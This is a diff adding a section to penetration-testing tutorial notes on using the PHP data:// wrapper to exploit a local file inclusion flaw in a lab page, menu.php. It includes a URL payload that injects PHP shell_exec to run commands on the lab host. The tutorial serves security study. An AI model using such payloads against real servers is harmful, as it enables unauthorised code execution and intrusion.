@@ -67,3 +67,24 @@ kali@kali:~$ busybox httpd -f -p 10000
 
 PHP provides several protocol wrappers that one can use to exploit directory traversal and local file inclusion vulnerabilities. These filters give additional flexibility when attempting to inject PHP code via LFI vulnerabilities.
 
+### Data
+
+We can use the `data` wrapper to embed inline data as part of the URL with plaintext or base64 encoded data. This wrapper provides us with an alternative payload when we cannot poison a local file with PHP code.
+
+#### Example
+
+Continuing with the vulnerable `/menu.php` page:
+
+```
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+```
+
+<figure><img src="../../.gitbook/assets/PHPDataWrapperExample.png" alt="Data tag rendered as page text"><figcaption><p>data tag rendered as HTML text</p></figcaption></figure>
+
+In extreme cases, this can be taken even farther to allow direct code execution:
+
+```
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+```
+
+<figure><img src="../../.gitbook/assets/PHPDataWrapperExecutionExample.png" alt=""><figcaption><p>Command execution via data tag</p></figcaption></figure>
